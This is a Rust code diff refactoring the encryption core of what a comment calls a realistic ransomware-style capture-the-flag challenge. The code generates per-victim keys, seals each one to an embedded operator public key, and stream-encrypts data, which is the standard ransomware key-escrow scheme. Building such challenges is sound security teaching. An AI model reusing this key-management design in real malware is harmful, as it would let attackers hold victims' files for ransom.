@@ -18,10 +18,17 @@ use zeroize::Zeroize;
 const BLOCK_SIZE: usize = 1024 * 1024;
 static OPERATOR_PUBLIC_KEY: &'static [u8; 32] = include_bytes!("../assets/operator_public_key.bin");
 
-#[derive(Clone, Debug)]
+#[derive(Clone, Debug, PartialEq)]
 pub struct PerVictimKey {
     victim_id: Uuid,
     keypair: dryocbox::KeyPair,
+}
+
+impl std::ops::Deref for PerVictimKey {
+    type Target = dryocbox::KeyPair;
+    fn deref(&self) -> &Self::Target {
+        &self.keypair
+    }
 }
 
 impl PerVictimKey {
@@ -35,9 +42,11 @@ impl PerVictimKey {
         Self::new(&victim_id, dryocbox::SecretKey::gen())
     }
     pub fn dump(self: &Self) -> Vec<u8> {
-        let mut serialized = Vec::new();
+        // Note: with_capacity is important! Otherwise we would have to zeroize the secret key.
+        let mut serialized =
+            Vec::with_capacity(self.victim_id.as_bytes().len() + self.secret_key.len());
         serialized.extend_from_slice(self.victim_id.as_bytes());
-        serialized.extend_from_slice(&self.keypair.secret_key);
+        serialized.extend_from_slice(&self.secret_key);
         serialized
     }
     pub fn parse(data: &[u8]) -> Option<Self> {
@@ -58,8 +67,8 @@ impl PerVictimKey {
         // This likely does not matter at all: we are authoring a CTF, not a real ransomware,
         // but we want to make it as realistic as possible.
         let identity_proof =
-            Auth::compute_to_vec(self.keypair.secret_key.clone(), &self.victim_id.as_bytes());
-        let kdf = kdf::Kdf::from_parts(self.keypair.secret_key.clone(), kdf::Context::default());
+            Auth::compute_to_vec(self.secret_key.clone(), &self.victim_id.as_bytes());
+        let kdf = kdf::Kdf::from_parts(self.secret_key.clone(), kdf::Context::default());
         let mut ekp_seed: [u8; 32] = kdf.derive_subkey(2).unwrap();
         let ephemeral_key = dryocbox::KeyPair::from_seed(&ekp_seed);
         let mut nonce = dryocbox::Nonce::new_byte_array();
@@ -71,7 +80,7 @@ impl PerVictimKey {
         let mut sealed = ephemeral_key.public_key.to_vec();
         sealed.append(
             &mut DryocBox::encrypt_to_vecbox(
-                &self.keypair.secret_key,
+                &self.secret_key,
                 &nonce,
                 &OPERATOR_PUBLIC_KEY.into(),
                 &ephemeral_key.secret_key,
@@ -127,20 +136,16 @@ pub fn encrypt_stream(
     // This is basically hand-rolled dryoc::dryocbox::Box, but works on stream.
     let ephemeral_key = dryocbox::KeyPair::gen();
     let mut header = EncryptedStreamHeader {
-        sk_sha256: Sha256::digest(&key.keypair.secret_key.as_array()).into(),
+        sk_sha256: Sha256::digest(&key.secret_key.as_array()).into(),
         epk: ephemeral_key.public_key.clone(),
         tag: [0; 16],
     };
     let mut shared_key = dryoc::classic::crypto_box::crypto_box_beforenm(
-        key.keypair.public_key.as_array(),
+        key.public_key.as_array(),
         ephemeral_key.secret_key.as_array(),
     );
     let mut nonce = dryocbox::Nonce::new();
-    crypto_box_seal_nonce(
-        &mut nonce,
-        &ephemeral_key.public_key,
-        &key.keypair.public_key,
-    );
+    crypto_box_seal_nonce(&mut nonce, &ephemeral_key.public_key, &key.public_key);
     let mut cipher = XSalsa20::new(&shared_key.into(), nonce.as_array().into());
     shared_key.zeroize();
     let mut mackey = onetimeauth::Key::new();
@@ -169,7 +174,7 @@ fn decrypt_stream(
     input: &mut impl std::io::Read,
     output: &mut impl std::io::Write,
 ) -> std::io::Result<()> {
-    if Sha256::digest(key.keypair.secret_key.as_array()) != header.sk_sha256.into() {
+    if Sha256::digest(key.secret_key.as_array()) != header.sk_sha256.into() {
         return Err(std::io::Error::new(
             std::io::ErrorKind::InvalidData,
             "Wrong secret key",
@@ -177,10 +182,10 @@ fn decrypt_stream(
     }
     let mut shared_key = dryoc::classic::crypto_box::crypto_box_beforenm(
         header.epk.as_array(),
-        key.keypair.secret_key.as_array(),
+        key.secret_key.as_array(),
     );
     let mut nonce = dryocbox::Nonce::new();
-    crypto_box_seal_nonce(&mut nonce, &header.epk, &key.keypair.public_key);
+    crypto_box_seal_nonce(&mut nonce, &header.epk, &key.public_key);
     let mut cipher = XSalsa20::new(&shared_key.into(), nonce.as_array().into());
     shared_key.zeroize();
     let mut mackey = onetimeauth::Key::new();
@@ -234,7 +239,6 @@ mod tests {
         let key = PerVictimKey::generate(&uuid::uuid!("01234567-89ab-cdef-0123-456789abcdef"));
         let dumped = key.dump();
         let parsed = PerVictimKey::parse(&dumped).unwrap();
-        assert_eq!(key.keypair, parsed.keypair);
-        assert_eq!(key.victim_id, parsed.victim_id);
+        assert_eq!(key, parsed);
     }
 }
